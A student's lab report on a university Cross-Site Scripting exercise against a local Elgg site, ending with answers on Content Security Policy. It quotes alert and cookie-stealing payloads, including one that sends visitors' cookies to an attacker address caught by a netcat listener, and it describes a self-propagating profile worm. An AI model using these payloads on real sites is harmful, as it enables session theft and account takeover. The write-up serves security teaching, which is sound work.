﻿

Korcak 1

Marco Korcak

CSC 223

Professor Zhang

30 October 2022

Cross-Site Scripting (XSS) Lab

**Lab Environment Setup**

The image above shows the lab environment setup by adding the DNS configurations and the websites

relating to the ip addresses in the /etc/hosts file using the command “sudo nano /etc/hosts”. Along with

this the commands “docker-compose build” and “docker-compose up” were used to start the Elgg

container. With all of this setup, all of the websites were running properly and could be visited.

**Task 1**





Korcak 2

**Ans**: For task 1, we were tasked with embedding a JavaScript program into a Elgg profile so

when another user views the profile the script will be executed. We were provided with the code:

<script<alert(‘XSS’);</script> and this was used to create the alert. This segment of code was

placed in the brief description section of Alice’s profile. The first image shows the code being

placed in the “brief description” section and the second image shows the result of when the code

is executed. The second image shows an alert box popping up when Alice’s profile is being

visited.

**Task 2**

The image above shows the script that was added to the “about me” section of Alice’s profile





Korcak 3

The image above shows the cookies of Alice’s profile when she is viewing her own account

The image above shows the cookies of Samy’s profile when viewing Alice’s profile

**Ans:** In task 2, the objective was to embed a JavaScript program in Alice’s profile to display the

cookies of the person visiting her profile. The cookies will be displayed in an alert pop up

window and it was achieved by adding the following code:

<script>alert(document.cookie);</script> into the “About me” section of Alice’s profile. The

images above show what the code displays when Alice’s account is viewed from another

account. In the instance above, Alice’s account was viewed from Samy’s profile which revealed

Samy’s cookies.





Korcak 4

**Task 3**

The image above shows the code that was added to Alice’s profile in the “About Me” section

The image above shows how Alice’s profile looks when the code is embedded in her profile

The image above shows the results of running “nc -lknv 5555” in the terminal and this displayed

Samy’s cookies when he visited Alice’s profile





Korcak 5

**Ans:** In task 3 the objective was to steal cookies from the victim’s machine, the victim being the

user visiting Alice’s account. In previous tasks, the malicious JavaScript code the cookies would

be printed out and only the user can see the cookies, not the attacker. In this task, the cookies

were sent to the attacker and in order to achieve this, the code was inserted into a <img> tag. The

<img> tag was used since when a browser tries to load the image, a HTTP GET request will be

sent to the attacker’s machine on the port 5555. The code: <script>document.write(‘<img src =

[http://10.9.0.1:5555?c=](http://10.9.0.1:5555/?c=)[’](http://10.9.0.1:5555/?c=)[ ](http://10.9.0.1:5555/?c=)[+](http://10.9.0.1:5555/?c=)[ ](http://10.9.0.1:5555/?c=)escape(document.cookie) + ‘ >’); was put in the “About Me” section

of Alice’s profile. This code sent the cookies over the port 5555 to the attacker’s machine which

has the ip address of 10.9.0.1. Once this was done, the netcat program had to be used in terminal

so that the 5555 port can be listened to for incoming connections. The result of running this

command “nc -lknv 5555” printed the Elgg cookies of the user visiting Alice’s website which in

the image above is Samy.

**Task 4**

The image above shows the JavaScript code that was added to Samy’s profile

The image above shows that Alice is now friends with Samy just by visiting his page





Korcak 6

**Ans:** In this task the objective was to become a victim’s friend through the use of JavaScript

code. This was meant to mimic the Samy worm that occurred in 2005 but in this task, it was not

self-propagating yet. In this task the JavScript program would forge a HTTP request directly

from the victim’s browser without the intervention of the attacker. The first screenshot shows the

code that was added into the “About Me” section of Samy’s profile. This was done by enabling

Text Mode since the default Editor Mode adds extra HTML code to the text typed. In the code,

the url specified wa[s](http://www.seed-server.com/action/friends/add)[ ](http://www.seed-server.com/action/friends/add)<http://www.seed-server.com/action/friends/add>[ ](http://www.seed-server.com/action/friends/add)+ “?friend=59” + token + ts

and this forged a HTTP request. Samys user id (guid) had to be specified in the code in order for

the attack to work. The variables ts and token were added in order to correctly forge a request

since these are needed to be considered correct requests due to countermeasures. Once all of this

was done, when a user visited Samy’s profile, they would automatically be added as his friend

which is evident in the second picture where Alice visited Samy’s page.

**Question 1:** Explain the purpose of Lines CD and @, why are they are needed?

**Ans:** Lines CD and @ are needed because they serve the purpose of getting the values for \_\_elgg\_ts and

\_\_elgg\_token. These two parameters are needed because without them a HTTP request cannot be forged

since they are expected. These two parameters serve as a security measure to prevent CSRF attacks, as

explored in the pervious lab. These two values are uniquely generated and change for each user which

makes it difficult to forge requests and secures the elgg website. In essence, these two lines are needed in

order to make a correct HTTP request and are added to the end of the url so Samy can carry out his attack

successfully.

**Question 2:** If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you

cannot switch to the Text mode, can you still launch a successful attack?

**Ans:** If the Elgg application would only provide Editor Mode for the “About Me” field and did not let

user’s to switch to Text Mode, the attack cannot be launched successfully. This attack would not be able

to be launched successfully because as mentioned in the task, extra HTML code is added to what would

be typed. This extra added code can hinder our attack by adding unnecessary symbols and characters that

can prevent the code from executing properly. Due to this reason, Text Mode is needed to launch this

attack properly.





Korcak 7

**Task 5**

The image above shows the JavaScript code that was added in order to achieve the task

The image above shows that Alice’s “About Me” section was changed as a result of viewing Samys page

**Ans:** In this task the objective was to modify the victim’s profile when Samy’s page is visited. In order to

achieve this, JavaScript code was added that will be executed when the victim visits Samy’s profile. The

JavaScript code forges a HTTP POST request that modifies the victim’s user profile. The task provided us

with a skeleton code that I added to in order to complete this task. As seen in the first screen shot above,

the malicious code was added into the “About Me” section of Samy’s profile in Text Mode. The code

consisted of initial variables such as the username of the person visiting the page, the user id of the

victim, Samy’s user id, \_\_elgg\_ts, \_\_elgg\_token as well as a url that would be sent. The url was

<http://www.seed-server.com/action/profile/edit>[ ](http://www.seed-server.com/action/profile/edit)and added to this url was “token + ts + username + desc +

guid”. All of this information made a valid HTTP request that would modify the victim’s user profile. The

desc variable was set to “Samy is my hero” which can be seen in the second screenshot where that is





Korcak 8

Alice’s profile description. All of this code is executed when a user visits Samy’s profile and allows the

victims profile to be edited.

**Question 3:** Why do we need Line CD? Remove this line, and repeat your attack. Report and explain

your observation?

**Ans:** Line CD in the JavaScript code checks if the guid of the user is not Samy’s guid and if it is not, it

executes more code. If this line of code was not included, then the request would be sent out even if Samy

viewed his own profile. When removing this line of code, Samy’s profile is edited and the message

“Samy is my hero” is displayed in the “About Me” section. This line of code serves as a precaution so

that the code does not edit his own profile but the profiles of others and this can only be determined by

getting their guid’s.

**Task 6**

The image above shows the JavaScript code that was put in Samy’s account

The image above shows that Alice’s account was infected





Korcak 9

The image above shows that Charlies account was infected

The image above shows that the code was put into Boby’s account after being infected with the worm

**Ans:** In task 6 the objective was to create the self-propagating worm so that when a user visits an infected

profile their profile is modified and then anyone who views infected profiles will become infected. This

attack can be carried out through a link approach or a DOM approach and for this task it was done using

the DOM approach. In order to complete the objective, an entire JavaScript program was embedded in the

Samy’s profile. This utilized the DOM API to retrieve a copy of itself from the web page, making the

worm work as intended. The JavaScript code used a URL encoding function that URL-encodes a string

that includes the header tag, JavaScript code and well as the tail tag. Information that was used in the

previous tasks such as user name, user guid, \_\_elgg\_ts, \_\_elgg\_token, description, content, Samy’s guid

and url was all needed to carry out this attack. The link used was [http://www.seed-](http://www.seed-server.com/action/profile/edit)

[server.com/action/profile/edit](http://www.seed-server.com/action/profile/edit)[ ](http://www.seed-server.com/action/profile/edit)and all of this information was used to create and send a request to modify

a user’s profile. What made this code self-propagating was that once the code ran, it was added to the

victim’s profile and would be transferred to another user when they got infected. A person that was

infected would have the words “Worm is spreading” in their profile indicating they have been infected.





Korcak 10

**Task 7**

**Question 1:** Describe and explain your observations when you visit these websites.

**Ans:** When visiting the three websites, each website displayed the status for various aspects of the CSP

experiments that were labeled areas 1 – 6. In the first website: [www.example32a.com](http://www.example32a.com/)[,](http://www.example32a.com/)[ ](http://www.example32a.com/)the status of each

area was “OK” which signaled that the JavaScript code for each area executed correctly. In contrast, when

visiting the second website, [www.example32b.com](http://www.example32b.com/)[ ](http://www.example32b.com/)the results were different from the first website. The

JavaScript code was not executed properly in this website since the status for areas 1,2,3 and 5 were

“Failed” while areas 4 and 6 had the status “OK”. This indicates that there are issues with the JavaScript

code and was not functioning properly. Lastly, in website thre[e,](http://www.example32c.com/)[ ](http://www.example32c.com/)[www.example32c.com](http://www.example32c.com/)[,](http://www.example32c.com/)[ ](http://www.example32c.com/)[t](http://www.example32c.com/)here were issues

with areas 2,3 and 5 since they had the “Failed” status while areas 1,4 and 6 had the “OK” status.





Korcak 11

**Question 2:** Click the button in the web pages from all the three websites, describe and explain your

observations.

**Ans:** When visiting the first websit[e,](http://www.example32a.com/)[ ](http://www.example32a.com/)[www.example32a.com](http://www.example32a.com/)[,](http://www.example32a.com/)[ ](http://www.example32a.com/)and clicking the button at the bottom of

the page an alert pops up on the window with the text “JS Code executed!”. In contrast, when clicking

the button for the second and third websit[e,](http://www.example32b.com/)[ ](http://www.example32b.com/)[www.example32b.com](http://www.example32b.com/)[ ](http://www.example32b.com/)and [www.example32c.com](http://www.example32c.com/)[ ](http://www.example32c.com/)nothing

happened. No alert box showed up and there were no changes shown. A possible explanation as to why

the websites did not change when the buttons were clicked is because the JavaScript code was not

executing properly as is evident by the “Failed” status in multiple areas present on both websites. The

first website had the “OK” status on all areas meaning the JavaScript code executed properly so an alert

was shown. Since the code was not executing properly in the second and third websites, no changes

occurred when the buttons were clicked.

**Question 3:** Change the server configuration on example32b (modify the Apache configuration), so

Areas 5 and 6 display OK. Please include your modified configuration in the lab report.

**Ans:** Areas 5 and 6 now display the status “OK” after altering the Apache configuration. In the

configuration I added “ ‘nonce-111-111-111’ ‘nonce-222-222-222’ \\*.example60.com”. This addition

fixed areas 1,2,5 and 6 because after restarting the Apache service, these areas were now included in

the header. In the original Apache file, the two nonces were not included and the website,

[www.example60.com](http://www.example60.com/)[,](http://www.example60.com/)[ ](http://www.example60.com/)[w](http://www.example60.com/)as not included so it would not execute correctly.





Korcak 12

**Question 4:** Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5,

and 6 all display OK. Please include your modified configuration in the lab report.

**Ans:** After editing the phpindex.php file by adding “ ’nonce-222-222-222’ \*.example60.com” areas 2 and

5 showed the “OK” status. This is because the nonce and website were now specified in the header

whereas previously it was not specified so the status was “Failed”. Areas 1,4 and 6 had the status “OK”

and were in the header so those did not need to be fixed.

**Question 5:** Please explain why CSP can help prevent Cross-Site Scripting attacks.

Ans: CSP stands for Content Security Policy and this is a computer security standard that was introduced

to prevent cross-site scripting attacks. CSP can be used to prevent cross-site scripting attacks because of

the features it provides and extra security. CSP restricts the resources (ex. Scripts and images) that a

page can load which prevents cross-site scripting attacks. In order to enable CSP, a response must be

included in a HTTP response header labeled “Content-Security-Policy” and this must have a value

containing the policy. A nonce (random value) can be specified by the CSP directive and the same value

must be used in the tag that loads a script in order to execute. If the values do not match, the script will

not be executed, which makes it difficult for an attacker to guess this value since each page has a

randomly generated nonce. Moreover, a hash can be specified for a trusted script and if the hash of a

script does not match the value of the hash provided in the directive, it will not execute. CSP is used to

prevent scripts from executing by adding an extra layer of security through the use of additional header

requirements. These requirements deter attackers since it is difficult forge valid requests.
